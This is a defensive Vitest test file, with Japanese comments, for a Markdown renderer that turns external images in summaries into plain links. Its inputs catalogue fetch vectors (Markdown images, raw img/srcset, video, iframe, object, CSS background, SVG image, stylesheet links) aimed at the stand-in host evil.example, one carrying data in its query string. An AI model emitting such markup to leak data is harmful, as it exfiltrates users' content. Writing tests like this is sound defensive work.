// 要約などの Markdown の画像を読み込まない（#252）。画面と同じ Markdown コンポーネントで描画して確かめる
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';

import { describe, expect, it } from 'vitest';

import { Markdown } from '@/components/Markdown';

function render(md: string, streaming = false) {
    const container = document.createElement('div');
    container.innerHTML = renderToStaticMarkup(createElement(Markdown, { children: md, streaming }));
    return container;
}

// 外のサーバーを指す属性。ブラウザが勝手に取りに行きうるもの（Streamdown のリンクはボタンなので、href も出ない）
function fetchingAttributes(container: HTMLElement) {
    const found: string[] = [];
    for (const el of container.querySelectorAll('*')) {
        for (const attr of el.attributes) {
            if (attr.value.toLowerCase().includes('evil.example')) {
                found.push(`<${el.tagName.toLowerCase()} ${attr.name}="${attr.value}">`);
            }
        }
    }
    return found;
}

// Streamdown のリンク（押すと確認を出してから開くボタン）の文字
const links = (container: HTMLElement) =>
    Array.from(container.querySelectorAll('[data-streamdown="link"]'), (el) => el.textContent);

describe('Markdown の画像', () => {
    it('外部の画像は読み込まず「画像: <URL>」のリンクにする', () => {
        const url = 'https://evil.example/a.png?d=%E5%AE%BF%E9%A1%8C';
        const container = render(`## 宿題\n\n![要約の中身](${url})`);
        expect(container.querySelector('img')).toBeNull();
        expect(fetchingAttributes(container)).toEqual([]);
        expect(links(container)).toEqual([`画像: ${url}`]);
    });

    it('参照の形・大文字・プロトコル相対の URL も読み込まない', () => {
        const container = render(
            [
                '![参照][r]',
                '',
                '![大文字](HTTPS://EVIL.EXAMPLE/UPPER.PNG)',
                '',
                '![相対](//evil.example/p.png)',
                '',
                '[r]: https://evil.example/ref.png',
            ].join('\n'),
        );
        expect(container.querySelector('img')).toBeNull();
        expect(fetchingAttributes(container)).toEqual([]);
        // 参照の形は Streamdown がブロックごとに読むので画像にならない。大文字のスキームは sanitize が src を落とす
        expect(links(container)).toEqual(['画像: https://evil.example/p.png']);
    });

    it('raw HTML の画像や、外を読みに行く要素も止める', () => {
        const container = render(
            [
                '<img src="https://evil.example/raw.png" alt="raw">',
                '',
                '<img srcset="https://evil.example/srcset.png 1x">',
                '',
                '<picture><source srcset="https://evil.example/source.png"><img src="https://evil.example/pic.png"></picture>',
                '',
                '<video poster="https://evil.example/poster.png" src="https://evil.example/v.mp4"></video>',
                '',
                '<audio src="https://evil.example/a.mp3"></audio>',
                '',
                '<input type="image" src="https://evil.example/input.png">',
                '',
                '<iframe src="https://evil.example/frame"></iframe>',
                '',
                '<object data="https://evil.example/obj"></object><embed src="https://evil.example/embed">',
                '',
                '<div style="background:url(https://evil.example/bg.png)">背景</div>',
                '',
                '<svg><image href="https://evil.example/svg.png"></image></svg>',
                '',
                '<link rel="stylesheet" href="https://evil.example/s.css">',
            ].join('\n'),
        );
        // <input> は sanitize がチェックボックスにする（src は落ちる）
        expect(container.querySelector('img, iframe, video, audio, object, embed, source, image, link')).toBeNull();
        expect(fetchingAttributes(container)).toEqual([]);
        // raw HTML の <img> も、ほかと同じくリンクにする
        expect(links(container)).toEqual(['画像: https://evil.example/raw.png', '画像: https://evil.example/pic.png']);
    });

    it('data: などの外部でない画像は出さない', () => {
        const container = render('前![点](data:image/png;base64,iVBORw0KGgo=)後\n\n![相対](/api/x.png)');
        expect(container.querySelector('img')).toBeNull();
        expect(links(container)).toEqual([]);
        expect(container.textContent).toContain('前後');
    });

    it('リンクの中の画像は、リンクを入れ子にしない', () => {
        const container = render('[![バッジ](https://evil.example/badge.svg)](https://example.com/page)');
        expect(container.querySelector('img')).toBeNull();
        expect(container.querySelectorAll('[data-streamdown="link"] [data-streamdown="link"]')).toHaveLength(0);
        expect(links(container)).toEqual(['画像: https://evil.example/badge.svg']);
    });

    it('書きかけの要約（streaming）でも読み込まない', () => {
        for (const md of ['![x](https://evil.example/partial', '![x](https://evil.example/done.png) の続き']) {
            const container = render(md, true);
            expect(container.querySelector('img')).toBeNull();
            expect(fetchingAttributes(container)).toEqual([]);
        }
    });

    it('ふつうのリンクと文はそのまま', () => {
        const container = render('詳しくは [資料](https://example.com/doc) を見ます');
        expect(links(container)).toEqual(['資料']);
        expect(container.textContent).toContain('を見ます');
    });
});
